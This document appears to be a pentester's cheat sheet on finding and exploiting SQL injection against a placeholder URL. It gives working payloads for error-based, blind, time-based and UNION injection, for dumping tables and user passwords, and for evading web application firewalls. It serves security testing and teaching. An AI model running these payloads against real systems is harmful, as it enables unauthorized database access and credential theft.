# 👀 Enumeration & Detection

SQL injection vulnerabilities occur when user input is incorrectly handled and executed as part of a SQL query. This cheat sheet outlines the essential steps and techniques a pentester can use to identify and confirm SQL injection vulnerabilities, complete with practical examples and terminal outputs.

Before probing for SQL injection, gather information about the target, such as the technologies used and the structure of the web application.

#### Check for Web Forms or Parameters

* Identify parameters that accept user input:
  * **URL Parameters** (`id=`, `product=`, `category=`)
  * **Form Fields** (login, search, registration)
  * **HTTP Headers** (User-Agent, Referer)
  * **Cookies**

#### Example Target URL:

```bash
http://target.com/products.php?id=5
```

### **Basic SQL Injection Test**

#### Single Quote Test

The most basic test for SQL injection is to add a single quote (`'`) to a parameter and observe how the server responds. A database error or unusual behavior may indicate SQL injection.

**Payload:**

```bash
http://target.com/products.php?id=5'
```

#### Expected Output (Error):

```bash
babel@target:/var/www$ curl http://target.com/products.php?id=5'
```

**Possible SQL error** (indicating vulnerable query):

```bash
SQL syntax error near '5''
```

#### Double Quote or Comment Test

If a single quote does not cause any changes, try adding a comment sequence (`--`), which is commonly used to ignore the rest of the SQL query.

**Payload:**

```bash
http://target.com/products.php?id=5--
```

If the page behaves differently (e.g., returns a normal page or shows an SQL error), the parameter may be vulnerable.

### **Error-Based SQL Injection**

Error-based SQL injection relies on generating detailed database errors that leak information about the database structure.

#### Common Errors to Look for:

* **MySQL**: `You have an error in your SQL syntax`
* **SQL Server**: `Unclosed quotation mark after the character string`
* **PostgreSQL**: `unterminated quoted string`

#### Example Payloads to Trigger Errors:

**Incorrect SQL Syntax:**

```bash
http://target.com/products.php?id=5'
```

#### Double Query Test:

Try concatenating multiple SQL queries to provoke errors.

```sql
http://target.com/products.php?id=5'; SELECT * FROM users--
```

#### Example Output (MySQL):

```bash
SQL syntax error in line 1 near '5'; SELECT * FROM users'
```

Blind SQL injection occurs when no error message is shown, but you can infer behavior based on changes in the response. For instance, true/false queries can determine if the injection is successful.

#### Boolean-Based Blind SQL Injection

Test if a query condition is evaluated as `true` or `false` by changing a query's logic. For example, if injecting `' OR 1=1--` returns the same page and `' OR 1=0--` returns a different one, the parameter is likely vulnerable.

**Payloads:**

```bash
http://target.com/products.php?id=5' OR 1=1--
http://target.com/products.php?id=5' OR 1=0--
```

#### Expected Behavior:

* **`1=1`**: Returns the page as usual.
* **`1=0`**: Causes a different response (error or no data).

#### Example Terminal Command:

```bash
babel@target:/var/www$ curl http://target.com/products.php?id=5' OR 1=1--
```

#### Time-Based Blind SQL Injection

Use the `SLEEP()` function in MySQL (or `WAITFOR DELAY` in SQL Server) to test if the query is being processed. If the server delays its response, it’s a strong indication of SQL injection.

**Payload (MySQL):**

```bash
http://target.com/products.php?id=5' OR IF(1=1, SLEEP(5), 0)--
```

#### Expected Behavior:

* **Response delayed by 5 seconds**: SQL injection confirmed.

#### Example Terminal Command:

```bash
babel@target:/var/www$ time curl http://target.com/products.php?id=5' OR IF(1=1, SLEEP(5), 0)--
```

### **Union-Based SQL Injection**

Union-based SQL injection combines the results of two or more `SELECT` statements. This allows attackers to extract data from different database tables.

#### Step 1: Identify the Number of Columns

To successfully execute a `UNION` query, the number of columns in both queries must match. Inject `ORDER BY` clauses incrementally until an error occurs, revealing the column count.

**Payload:**

```bash
http://target.com/products.php?id=5' ORDER BY 1--
http://target.com/products.php?id=5' ORDER BY 2--
http://target.com/products.php?id=5' ORDER BY 3--
```

#### Example Output:

```bash
SQL error: Unknown column '4' in 'order clause'
```

This tells us that the query has 3 columns.

#### Step 2: Inject a Union Query

Once the column count is known, the `UNION` query can be used to extract data from other tables.

**Example Payload:**

```bash
http://target.com/products.php?id=5' UNION SELECT 1,2,3--
```

#### Step 3: Extract Sensitive Data

After confirming the `UNION` query works, modify it to extract information such as usernames or database versions.

**Extract the Database Version:**

```sql
http://target.com/products.php?id=5' UNION SELECT 1, @@version, 3--
```

**Example Output:**

```bash
5.7.33-0ubuntu0.16.04.1
```

### **Fingerprint the Database**

Once SQL injection is confirmed, it is important to identify the type of database and its version, as different databases may require slightly different syntax for successful exploitation.

#### Common Payloads:

**Database Version:**

```sql
http://target.com/products.php?id=5' UNION SELECT @@version,2,3--
```

**Current User:**

```sql
http://target.com/products.php?id=5' UNION SELECT user(),2,3--
```

**Current Database:**

```sql
http://target.com/products.php?id=5' UNION SELECT database(),2,3--
```

#### Example Output (MySQL):

```bash
babel@target:/var/www$ curl http://target.com/products.php?id=5' UNION SELECT user(), database(), version()--
```

```bash
root@localhost | shop_db | 5.7.33-0ubuntu0.16.04.1
```

### **Enumerate Database Tables and Columns**

After confirming SQL injection and fingerprinting the database, the next step is to enumerate the tables and columns.

#### List All Tables

To list all tables from the database, query the `information_schema.tables`:

```sql
http://target.com/products.php?id=5' UNION SELECT 1, table_name, 3 FROM information_schema.tables WHERE table_schema=database()--
```

#### Example Output:

```bash
users
orders
products
```

#### List Columns from a Specific Table

Once a table of interest is identified, list its columns:

```sql
http://target.com/products.php?id=5' UNION SELECT 1, column_name, 3 FROM information_schema.columns WHERE table_name='users'--
```

#### Example Output:

```bash
id
username
password
email
```

### **Extract Data from the Database**

Finally, extract valuable data such as usernames and passwords from the identified tables.

#### Example Payload:

```sql
http://target.com/products.php?id=5' UNION SELECT 1, username, password FROM users--
```

#### Example Output:

```bash
admin | admin123
user1 | password1
```

### **Bypassing WAF and Filters**

Web Application Firewalls (WAFs) or input filters may block basic SQL injection payloads. To bypass these protections, try:

* **Case Variations**: `SELECT` → `sElEcT`
*   **Inline Comments**: Break keywords using comments (`/**/`):

    ```sql
    SELECT/*comment*/username FROM users
    ```
*   **Encoding**: URL-encode special characters:

    ```bash
    %27 (for ') or %20 (for space)
    ```

***

#### Summary Checklist for SQL Injection Enumeration:

* [ ] Identify injectable points (parameters, forms, cookies).
* [ ] Test with single quote and basic syntax errors.
* [ ] Use union-based injection to extract data.
* [ ] Use time-based queries for blind SQLi.
* [ ] Enumerate tables, columns, and data.
* [ ] Bypass WAFs using obfuscation techniques.

